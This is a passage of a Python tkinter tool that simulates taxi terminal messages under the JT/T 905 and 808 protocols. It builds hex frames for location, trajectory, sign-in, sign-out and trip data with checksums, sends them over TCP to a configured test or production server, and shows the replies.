# coding=utf-8
import binascii
import csv
import os
import threading
import tkinter as tk
from tkinter import *
from tkinter.colorchooser import askcolor
from tkinter.ttk import *

import ttkbootstrap as ttk

from V3ku import *
from 出租车.V905ku import 报警标志, 车辆状态, 经纬度, 速度, 签退方式, 报警标志1, 车辆状态1, 经纬度1, 速度1, 评价选项, \
    电召订单ID, 交易类型
from 报警 import *

LOG_LINE_NUM = 0
init_window = ttk.Window()  # 实例化出一个父窗口

s = ttk.Style()  # 实例化Style
s.theme_use("superhero")
# menubar = Menu(init_window, tearoff=False)

now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
now_time1 = time.strftime('%H%M%S', time.localtime())


def char_to_hex(char):
    return hex(ord(char))[2:]


def copy(editor, event=None):
    editor.event_generate("<<Copy>>")


def paste(editor, event=None):
    editor.event_generate('<<Paste>>')


def selectAll(editor, event=None):
    editor.tag_add('sel', '1.0', END)


# # # def rightKey(event, editor):
#     menubar.delete(0, END)
#     menubar.add_command(label='复制', command=lambda: copy(editor))
#     menubar.add_command(label='粘贴', command=lambda: paste(editor))
#     menubar.add_command(label='全选', command=lambda: selectAll(editor))
#     menubar.post(event.x_root, event.y_root)


# V3校验位
def crc1(data):
    crc = 0xFFFF
    data = binascii.unhexlify(data)

    for pos in data:
        crc ^= pos
        for i in range(8):
            lsb = crc & 0x0001
            crc >>= 1
            if lsb == 1:
                crc ^= 0x8408
    crc ^= 0xffff
    test = hex(crc).upper()
    return test


def get_xor(data):
    result = re.sub(r"(?<=\w)(?=(?:\w\w)+$)", " ", data)
    return result


def get_bcc(inputStr: str) -> str:
    bcc = 0
    for i in inputStr.split(' '):
        bcc = bcc ^ int(i, 16)

    return f'{bcc:x}'


def get_longitude(base_log=None, radius=None):
    radius_in_degrees = radius / 111300
    u = float(random.uniform(0.0, 1.0))
    v = float(random.uniform(0.0, 1.0))
    w = radius_in_degrees * math.sqrt(u)
    t = 2 * math.pi * v
    y = w * math.sin(t)
    longitude = y + base_log
    # print()
    return str(longitude)[:10]


def get_latitude(base_lat=None, radius=None):
    radius_in_degrees = radius / 111300
    u = float(random.uniform(0.0, 1.0))
    v = float(random.uniform(0.0, 1.0))
    w = radius_in_degrees * math.sqrt(u)
    t = 2 * math.pi * v
    x = w * math.cos(t)
    latitude = x + base_lat
    return str(latitude)[:9]


is_on = True
from tkinter.messagebox import *
import fnmatch

current_directory = os.getcwd()

# 设置MP3文件匹配模式
mp3_pattern = '*.mp3'
ico_pattern = '*.ico'
gif_pattern = '*.gif'


class MY_GUI(tk.Tk):
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        conf_ini = current_directory + "\\conf\\config.ini"
        config = ConfigObj(conf_ini, encoding='UTF-8')
        self.conf_wg = config['ces']['出租车_cswg']
        self.conf_905wg_port = config['ces']['出租车_cs905wg_port']
        self.conf_808wg_port = config['ces']['出租车_cs808wg_port']
        self.conf_wd = config['address']['茂名市WD']
        self.conf_jd = config['address']['茂名市JD']
        self.conf_wd1 = config['address']['规划WD']
        self.conf_jd1 = config['address']['规划JD']
        self.sbei905 = config['sbei']['905sbei']
        self.sbei808 = config['sbei']['808sbei']
        self.baojing = config['905baojing']
        self.baojing808 = config['808baojing']
        self.conf_驾驶员从业资格证号 = config['驾驶员从业资格证号']

    def wzhi905(self, su, plsu):
        global data, t
        count = 0
        try:
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd1 = float(self.wd()) * 60 / 0.0001
            wd2 = hex(int(wd1))
            jd1 = float(self.jd()) * 60 / 0.0001
            jd2 = hex(int(jd1))
            标识位 = '7E'
            消息ID = '0200'
            消息体属性 = '002F'
            流水号 = f'{random.randint(12, 20)}'.zfill(4)
            报警 = self.sb_bj()
            状态 = self.sb_ztai()
            纬度 = wd2[2:].zfill(8).upper()
            经度 = jd2[2:].zfill(8).upper()
            速度 = self.sdu()[2:].zfill(4).upper()
            方向 = f'{random.randint(12, 20)}'
            时间 = now_time[2:]
            附加 = f'0104000000{self.lic1().zfill(2)}0202044C250400000000300103'
            if self.sb_on() == '是':
                for i in range(int(su), int(plsu)):
                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加
                    a = get_xor(w)
                    b = get_bcc(a)
                    E = w + b.upper().zfill(2)
                    t = 标识位 + E.replace("7E", "00") + 标识位
                    D = get_xor(E)
                    data = '7E ' + D + ' 7E'
                    if data[:2] != "7E":
                        print(f"错误：{data}")
                        t = t[:81] + "00" + t[82:]
                        data = get_xor(t)
                        print("修改后data：{}".format(data))
                        print('\n' * 1)
                    count += 1
                    tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                    self.result_data_Text1.insert(1.0, tip_content)
                    time.sleep(float(self.times()))
                    if self.ip_on() == '是':
                        s = socket(AF_INET, SOCK_STREAM)
                        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
                        s.send(bytes().fromhex(data))
                        send = s.recv(1024).hex()
                        print(send.upper())
                        print('\n' * 1)
                        tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                        self.result_data_Text1.insert(1.0, tip_content)
                showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
            else:
                ISU标识 = self.sb_hao().zfill(12)
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加
                a = get_xor(w)
                b = get_bcc(a)
                E = w + b.upper().zfill(2)
                t = 标识位 + E.replace("7E", "00") + 标识位
                D = get_xor(E)
                data = '7E ' + D + ' 7E'
                if data[:2] != "7E":
                    print(f"错误：{data}")
                    t = t[:81] + "00" + t[82:]
                    data = get_xor(t)
                    print("修改后data：{}".format(data))
                    print('\n' * 1)
                count += 1
                tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                self.result_data_Text1.insert(1.0, tip_content)
                time.sleep(float(self.times()))
                if self.ip_on() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text1.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text1.insert(1.0, "总计发送成功位置数据条数:{}\n\n".format(str(count)))
        return ''

    # 部标位置
    def wzhi部标(self, su2, plsu2):
        global data
        count = 0
        try:
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd1 = float(self.wd部标())
            wd2 = wd1 * 1000000
            wd3 = hex(int(wd2))
            jd1 = float(self.jd部标())
            jd2 = jd1 * 1000000
            jd3 = hex(int(jd2))
            标识位 = '7E'
            消息ID = '0200'
            消息体属性 = '002F'
            流水号 = f'{random.randint(12, 20)}'.zfill(4)
            报警 = self.sb_bj2()
            状态 = self.sb_ztai2()
            纬度 = wd3[2:].zfill(8).upper()
            经度 = jd3[2:].zfill(8).upper()
            高程 = f'00{random.randint(12, 20)}'
            速度 = self.sdu2()[2:].zfill(4).upper()
            方向 = f'00{random.randint(12, 20)}'
            时间 = now_time[2:]
            附加信息ID = f'0104000000{self.lic().zfill(2)}0202044C250400000000300103'
            if self.sb_on2() == '是':
                for i in range(int(su2), int(plsu2)):
                    设备号 = self.sb_hao2().zfill(12)[:12 - len(f'{i}')] + f'{i}'
                    print(设备号)
                    w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加信息ID
                    a = get_xor(w)
                    b = get_bcc(a)
                    if b.upper() == "7E":
                        a.replace("00", "01")
                        b = get_bcc(a)
                    E = w + b.upper().zfill(2)
                    t = 标识位 + E.replace("7E", "01") + 标识位
                    D = get_xor(E)
                    data = '7E ' + D + ' 7E'
                    if data[:2] != "7E":
                        print(f"错误：{data}")
                        t = t[:81] + "00" + t[82:]
                        data = get_xor(t)
                        print("修改后data：{}".format(data))
                        print('\n' * 1)
                    print(data)
                    count += 1
                    tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                    self.result_data_Text2.insert(1.0, tip_content)
                    time.sleep(float(self.times()))
                    if self.ip_on2() == '是':
                        s = socket(AF_INET, SOCK_STREAM)
                        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                        s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
                        s.send(bytes().fromhex(data))
                        send = s.recv(1024).hex()
                        print(send.upper())
                        print('\n' * 1)
                        tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                        self.result_data_Text2.insert(1.0, tip_content)
                showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
            else:
                设备号 = self.sb_hao2().zfill(12)
                w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加信息ID
                a = get_xor(w)
                b = get_bcc(a)
                if b.upper() == "7E":
                    a.replace("00", "01")
                    b = get_bcc(a)
                E = w + b.upper().zfill(2)
                t = 标识位 + E.replace("7E", "01") + 标识位
                D = get_xor(E)
                data = '7E ' + D + ' 7E'
                if data[:2] != "7E":
                    print(f"错误：{data}")
                    t = t[:81] + "00" + t[82:]
                    data = get_xor(t)
                    print("修改后data：{}".format(data))
                    print('\n' * 1)
                print(data)
                count += 1
                tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                self.result_data_Text2.insert(1.0, tip_content)
                time.sleep(float(self.times()))
                if self.ip_on2() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                    s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text2.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text2.insert(1.0, "总计发送成功位置数据条数:{}\n".format(str(count)))
        return ""

    def 轨迹808(self):
        file_path = os.getcwd() + '/conf/12.csv'
        fCase = open(file_path, 'r', encoding='gbk')
        datas = csv.reader(fCase)
        data1 = []
        o = 0
        for line in datas:
            data1.append(line)
        for nob1 in range(0, int(self.count8())):
            t = data1[nob1]
            o += 1
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            消息ID = '0200'
            消息体属性 = '002F'
            设备号 = "0" + f'{self.sb_hao8()}'
            print(f'设备号:{设备号}')
            流水号 = f'{0}'.zfill(4)
            baojlxs = [
                self.baojing808['紧急报警'], self.baojing808['超速报警'], self.baojing808['疲劳驾驶'],
                self.baojing808['LED顶灯故障'],
                self.baojing808['进出区域路线报警'],
                self.baojing808['路段行驶时间不足'], self.baojing808['禁行路段行驶'], self.baojing808['车辆非法点火'],
                self.baojing808['车辆非法位移'], self.baojing808['所有清零报警'],
                self.baojing808['正常'], self.baojing808['危险预警'], self.baojing808['模块故障'],
                self.baojing808['模块开路'],
                self.baojing808['终端欠压'], self.baojing808['终端掉电'],
                self.baojing808['终端LCD故障'],
                self.baojing808['TTS故障'], self.baojing808['摄像头故障'], self.baojing808['当天累计驾驶时长'],
                self.baojing808['超时停车']
            ]
            报警 = random.choice(baojlxs)
            状态 = '00000003'
            wd2 = float(t[0]) * 1000000
            wd3 = hex(int(wd2))
            纬度 = wd3[2:].zfill(8).upper()
            jd2 = float(t[1]) * 1000000
            jd3 = hex(int(jd2))
            经度 = jd3[2:].zfill(8).upper()
            高程 = f'00{random.randint(12, 20)}'
            速度 = f'00{random.randint(12, 20)}'
            方向 = f'00{random.randint(12, 20)}'
            时间 = now_time[2:]
            附加里程 = f'0104000000{random.randint(10, 20)}'
            附加信息ID = '0202044C250400000000300103'
            w = 消息ID + 消息体属性 + 设备号 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 高程 + 速度 + 方向 + 时间 + 附加里程 + 附加信息ID
            a = get_xor(w)
            b = get_bcc(a)
            if b.upper() == "7E":
                a.replace("00", "01")
                b = get_bcc(a)
            E = w + b.upper().zfill(2)
            t = '7E' + E.replace("7E", "01") + '7E'
            D = get_xor(E)
            data = '7E ' + D + ' 7E'
            if data[:2] != "7E":
                print(f"错误：{data}")
                t = t[:81] + "00" + t[82:]
                data = get_xor(t)
                print("修改后data：{}".format(data))
                print('\n' * 1)
            print(data)
            s = socket(AF_INET, SOCK_STREAM)
            s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
            s.connect((f'{self.ip8()}', int(self.port8())))  # 生产
            s.send(bytes().fromhex(data))
            send = s.recv(1024).hex()
            print(send.upper())
            print('\n' * 1)
            tip_content = '\n位置数据：\n{}\n源数据：\n{}\n 服务器应答：\n{}\n'.format(data, t, send.upper())
            self.result_data_Text8.insert(1.0, tip_content)
            time.sleep(4)
        self.result_data_Text8.insert(1.0, "\n完成")
        showinfo("发送结果", "发送成功")

    def 轨迹905(self):
        file_path = os.getcwd() + '/conf/12.csv'
        fCase = open(file_path, 'r', encoding='gbk')
        datas = csv.reader(fCase)
        data1 = []
        o = 0
        for line in datas:
            data1.append(line)
        for nob1 in range(0, int(self.count905_8())):
            t = data1[nob1]
            o += 1
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd2 = float(t[0]) * 60 / 0.0001
            wd3 = hex(int(wd2))
            jd2 = float(t[1]) * 60 / 0.0001
            jd3 = hex(int(jd2))
            标识位 = '7E'
            消息ID = '0200'
            消息体属性 = '0023'
            ISU标识 = self.sbei905  # 10位
            流水号 = f'{1}'.zfill(4)
            baojing = [
                self.baojing['紧急报警'],
                self.baojing['危险预警'],
                self.baojing['定位模块故障'],
                self.baojing['定位天线开路'],
                self.baojing['定位天线短路'],
                self.baojing['终端主电源欠压'],
                self.baojing['终端主电源掉电'],
                self.baojing['液晶LCD显示故障'],
                self.baojing['语音模块TTS故障'],
                self.baojing['摄像头故障'],
                self.baojing['超速报警'],
                self.baojing['疲劳驾驶'],
                self.baojing['当天累计驾驶超时'],
                self.baojing['超时停车'],
                self.baojing['车速传感器故障'],
                self.baojing['录音设备故障'],
                self.baojing['计价器故障'],
                self.baojing['服务评价器故障'],
                self.baojing['LED广告屏故障'],
                self.baojing['液晶LED显示屏故障'],
                self.baojing['安全访问模块故障'],
                self.baojing['LED顶灯故障'],
                self.baojing['计价器实时时钟'],
                self.baojing['进出区域路线报警'],
                self.baojing['路段行驶时间不足'],
                self.baojing['禁行路段行驶'],
                self.baojing['车辆非法点火'],
                self.baojing['车辆非法位移'],
                self.baojing['所有清零报警'],
                self.baojing['紧急报警和超速报警'],
                self.baojing['正常']
            ]
            报警 = random.choice(baojing)
            状态 = '00000300'
            纬度 = wd3[2:].zfill(8).upper()
            经度 = jd3[2:].zfill(8).upper()
            速度 = f'00{random.randint(10, 15)}'
            方向 = f'{random.randint(10, 15)}'
            时间 = now_time[2:]
            附加里程 = f'0104000000{random.randint(10, 15)}'
            油量 = ['5208', '044C', '04B0']
            附加油量 = f'0202{random.choice(油量)}'
            w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 附加里程 + 附加油量
            a = get_xor(w)
            b = get_bcc(a).zfill(2)
            E = w + b.upper()
            t = 标识位 + E.replace("7E", "00") + 标识位
            D = get_xor(E)
            data = '7E ' + D + ' 7E'
            if data[:2] != "7E":
                print(f"错误：{data}")
                print('\n' * 1)
                t = t[:81] + "00" + t[82:]
                data = get_xor(t)
                print("修改后data：{}".format(data))
                print('\n' * 1)
            print(t)
            print(data)
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((self.conf_wg, int(self.conf_905wg_port)))  # 测试
            s.send(bytes().fromhex(data))
            send = s.recv(1024).hex()
            print('服务器应答：' + send.upper())
            print('\n' * 1)
            tip_content = '\n位置数据：\n{}\n源数据：\n{}\n 服务器应答：\n{}\n'.format(data, t, send.upper())
            self.result905_Text8.insert(1.0, tip_content)
            time.sleep(4)
        self.result905_Text8.insert(1.0, "\n完成")
        showinfo("发送结果", "发送成功")


    def qdao(self, su, plsu):
        count = 0
        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
        驾驶员从业资格证号1 = ''.join(hex_list)
        try:
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd1 = float(self.wd()) * 60 / 0.0001
            wd2 = hex(int(wd1))
            jd1 = float(self.jd()) * 60 / 0.0001
            jd2 = hex(int(jd1))
            标识位 = '7E'
            消息ID = '0B03'
            消息体属性 = '0043'
            流水号 = f'00{random.randint(12, 20)}'
            报警 = self.sb_bj()
            状态 = self.sb_ztai()
            纬度 = wd2[2:].zfill(8).upper()
            经度 = jd2[2:].zfill(8).upper()
            速度 = self.sdu()[2:].zfill(4).upper()
            方向 = f'{random.randint(12, 20)}'
            时间 = now_time[2:]
            企业经营许可证号 = '534E3132333435363738390000000000'  # SN123456789
            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345678
            车牌号 = '534E31323435'  # SN1234
            开机时间 = now_time[:12]
            附加 = '01040000006E0202044C250400000000300103'
            if self.sb_on() == '是':
                for i in range(int(su), int(plsu)):
                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 开机时间 + 附加
                    a = get_xor(w)
                    b = get_bcc(a)
                    E = w + b.upper().zfill(2)
                    t = 标识位 + E.replace("7E", "00") + 标识位
                    D = get_xor(E)
                    data = '7E ' + D + ' 7E'
                    if data[:2] != "7E":
                        print(f"错误：{data}")
                        t = t[:81] + "00" + t[82:]
                        data = get_xor(t)
                        print("修改后data：{}".format(data))
                        print('\n' * 1)
                    print(t)
                    print(data)
                    count += 1
                    tip_content = '\n签到数据：\n{}\n源数据：{}\n'.format(data, t)
                    self.result_data_Text1.insert(1.0, tip_content)
                    time.sleep(float(self.times()))
                    if self.ip_on() == '是':
                        s = socket(AF_INET, SOCK_STREAM)
                        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
                        s.send(bytes().fromhex(data))
                        send = s.recv(1024).hex()
                        print(send.upper())
                        print('\n' * 1)
                        tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                        self.result_data_Text1.insert(1.0, tip_content)
                showinfo("发送结果", "总计发送成功签到数据条数:  {}".format(str(count)))
            else:

                ISU标识 = self.sb_hao().zfill(12)
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 开机时间 + 附加
                a = get_xor(w)
                b = get_bcc(a)
                E = w + b.upper().zfill(2)
                t = 标识位 + E.replace("7E", "00") + 标识位
                D = get_xor(E)
                data = '7E ' + D + ' 7E'
                if data[:2] != "7E":
                    print(f"错误：{data}")
                    t = t[:81] + "00" + t[82:]
                    data = get_xor(t)
                    print("修改后data：{}".format(data))
                    print('\n' * 1)
                print(t)
                print(data)
                count += 1
                tip_content = '\n签到数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text1.insert(1.0, tip_content)
                time.sleep(float(self.times()))
                if self.ip_on() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text1.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功签到数据条数:  {}".format(str(count)))
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text1.insert(1.0, "总计发送成功签到数据条数:{}\n\n".format(str(count)))
        return ""

    def qtui(self, su, plsu):
        count = 0
        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
        驾驶员从业资格证号1 = ''.join(hex_list)
        try:
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd1 = float(self.wd()) * 60 / 0.0001
            wd2 = hex(int(wd1))
            jd1 = float(self.jd()) * 60 / 0.0001
            jd2 = hex(int(jd1))
            标识位 = '7E'
            消息ID = '0B04'
            消息体属性 = '0043'
            流水号 = f'00{random.randint(12, 20)}'
            报警 = self.sb_bj()
            状态 = self.sb_ztai()
            纬度 = wd2[2:].zfill(8).upper()
            经度 = jd2[2:].zfill(8).upper()
            速度 = self.sdu()[2:].zfill(4).upper()
            方向 = f'{random.randint(12, 20)}'
            时间 = now_time[2:]
            企业经营许可证号 = '534E3132333435363738390000000000'  # SN123456789
            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345678
            车牌号 = '534E31323435'  # SN1235
            计价器K值 = f'00{random.randint(12, 20)}'  # 计价12
            当班开机时间 = now_time[:12]
            当班关机时间 = now_time[:12]
            当班里程 = f'000{random.randint(30, 36)}0'  # 格式为XXXXX.X(km)
            当班营运里程 = f'000{random.randint(30, 36)}0'  # 格式为XXXXX.X(km)
            车次 = f'00{random.randint(12, 20)}'  # 车次12
            计时时间 = now_time1
            总计金额 = f'000{random.randint(12, 20)}0'
            卡收金额 = f'000{random.randint(12, 20)}0'
            卡次 = f'00{random.randint(12, 20)}'
            班间里程 = f'0{random.randint(30, 36)}0'
            总计里程 = f'00000{random.randint(30, 36)}0'
            总营运里程 = f'00000{random.randint(30, 36)}0'
            单价 = f'{random.randint(12, 20)}00'  # 12.00块
            总营运次数 = '0000001A'  # 高位在前就是在后面
            附加 = '01040000006E0202044C250400000000300103'
            if self.sb_on() == '是':
                for i in range(int(su), int(plsu)):
                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
                    if (i % 2) == 0:
                        签退方式 = '01'
                    else:
                        签退方式 = '00'
                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 计价器K值 + 当班开机时间 + 当班关机时间 + 当班里程 + 当班营运里程 + 车次 + 计时时间 + 总计金额 + 卡收金额 + 卡次 + 班间里程 + 总计里程 + 总营运里程 + 单价 + 总营运次数 + 签退方式 + 附加
                    a = get_xor(w)
                    b = get_bcc(a)
                    E = w + b.upper().zfill(2)
                    t = 标识位 + E.replace("7E", "00") + 标识位
                    D = get_xor(E)
                    data = '7E ' + D + ' 7E'
                    if data[:2] != "7E":
                        print(f"错误：{data}")
                        t = t[:81] + "00" + t[82:]
                        data = get_xor(t)
                        print("修改后data：{}".format(data))
                        print('\n' * 1)
                    print(t)
                    print(data)
                    count += 1
                    tip_content = '\n签退数据：\n{}\n源数据：{}\n'.format(data, t)
                    self.result_data_Text1.insert(1.0, tip_content)
                    time.sleep(float(self.times()))
                    if self.ip_on() == '是':
                        s = socket(AF_INET, SOCK_STREAM)
                        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
                        s.send(bytes().fromhex(data))
                        send = s.recv(1024).hex()
                        print(send.upper())
                        print('\n' * 1)
                        tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                        self.result_data_Text1.insert(1.0, tip_content)
                showinfo("发送结果", "总计发送成功签退数据条数:  {}".format(str(count)))
            else:
                ISU标识 = self.sb_hao().zfill(12)
                签退方式 = '00'
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 企业经营许可证号 + 驾驶员从业资格证号 + 车牌号 + 计价器K值 + 当班开机时间 + 当班关机时间 + 当班里程 + 当班营运里程 + 车次 + 计时时间 + 总计金额 + 卡收金额 + 卡次 + 班间里程 + 总计里程 + 总营运里程 + 单价 + 总营运次数 + 签退方式 + 附加
                a = get_xor(w)
                b = get_bcc(a)
                E = w + b.upper().zfill(2)
                t = 标识位 + E.replace("7E", "00") + 标识位
                D = get_xor(E)
                data = '7E ' + D + ' 7E'
                if data[:2] != "7E":
                    print(f"错误：{data}")
                    t = t[:81] + "00" + t[82:]
                    data = get_xor(t)
                    print("修改后data：{}".format(data))
                    print('\n' * 1)
                print(t)
                print(data)
                count += 1
                tip_content = '\n签退数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text1.insert(1.0, tip_content)
                time.sleep(float(self.times()))
                if self.ip_on() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text1.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功签退数据条数:  {}".format(str(count)))
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text1.insert(1.0, "总计发送成功签退数据条数:{}\n\n".format(str(count)))
        return ""

    def yyun(self, su, plsu):
        count = 0
        hex_list = [hex(ord(char))[2:].upper() for char in self.driver()]
        驾驶员从业资格证号1 = ''.join(hex_list)
        try:
            now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
            wd1 = float(self.conf_wd) * 60 / 0.0001
            wd2 = float(self.wd()) * 60 / 0.0001
            wd3 = hex(int(wd1))
            wd4 = hex(int(wd2))

            jd1 = float(self.conf_jd) * 60 / 0.0001
            jd2 = float(self.jd()) * 60 / 0.0001
            jd3 = hex(int(jd1))
            jd4 = hex(int(jd2))
            标识位 = '7E'
            消息ID = '0B05'
            消息体属性 = '0073'
            流水号 = f'00{random.randint(12, 20)}'
            报警 = self.sb_bj()
            状态 = self.sb_ztai()
            纬度 = wd3[2:].zfill(8).upper()
            经度 = jd3[2:].zfill(8).upper()
            速度 = self.sdu()[2:].zfill(4).upper()
            方向 = f'{random.randint(12, 20)}'
            时间 = now_time[2:]

            报警1 = self.sb_bj()
            状态1 = self.sb_ztai()
            纬度1 = wd4[2:].zfill(8).upper()
            经度1 = jd4[2:].zfill(8).upper()
            速度1 = self.sdu()[2:].zfill(4).upper()
            方向1 = f'{random.randint(12, 20)}'
            时间1 = now_time[2:]

            营运ID = '3590AA28'  # 001101  0110  01000  01010 101000 101000
            评价ID = '3590AA28'
            评价选项 = '01'
            评价选项扩展 = '0000'
            电召订单ID = '000'.zfill(8)
            车牌号 = '534E31323535'  # SN1255
            企业经营许可证号 = '534E3132333435363738393100000000'  # SN1234567891
            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345679
            上车时间 = 时间[:10]
            上车时间1 = 时间[:8] + '00'
            上车 = 时间[6:8].replace(f"{时间[6:8]}", "%02d" % (int(时间[6:8]) + 1))
            下车时间 = 上车 + 上车时间[8:]
            计程公里数 = f'000{random.randint(30, 36)}0'
            空驶里程 = f'0{random.randint(12, 30)}0'
            附加费 = f'000{random.randint(12, 20)}0'
            等待计时时间 = f'0{random.randint(12, 20)}0'
            交易金额 = f'000{random.randint(12, 20)}0'
            交易类型 = '03'  # 0x00:现金交易：0x01:M1卡交易：0x03：CPU卡交易：0x09:其他
            附加 = '01040000006E0202044C250400000000300103'
            if self.sb_on() == '是':
                for i in range(int(su), int(plsu)):
                    ISU标识 = self.sb_hao().zfill(12)[:12 - len(f'{i}')] + f'{i}'
                    当前车次 = f'{2}'.zfill(8)
                    w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 报警1 + 状态1 + 纬度1 + 经度1 + 速度1 + 方向1 + 时间1 + 营运ID + 评价ID + 评价选项 + 评价选项扩展 + 电召订单ID + 车牌号 + 企业经营许可证号 + 驾驶员从业资格证号 + 上车时间1 + 下车时间 + 计程公里数 + 空驶里程 + 附加费 + 等待计时时间 + 交易金额 + 当前车次 + 交易类型 + 附加
                    a = get_xor(w)
                    b = get_bcc(a)
                    E = w + b.upper().zfill(2)
                    t = 标识位 + E.replace("7E", "00") + 标识位
                    D = get_xor(E)
                    data = '7E ' + D + ' 7E'
                    if data[:2] != "7E":
                        print(f"错误：{data}")
                        t = t[:81] + "00" + t[82:]
                        data = get_xor(t)
                        print("修改后data：{}".format(data))
                        print('\n' * 1)
                    print(t)
                    print(data)
                    count += 1
                    tip_content = '\n营运数据：\n{}\n源数据：{}\n'.format(data, t)
                    self.result_data_Text1.insert(1.0, tip_content)
                    time.sleep(float(self.times()))
                    if self.ip_on() == '是':
                        s = socket(AF_INET, SOCK_STREAM)
                        s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
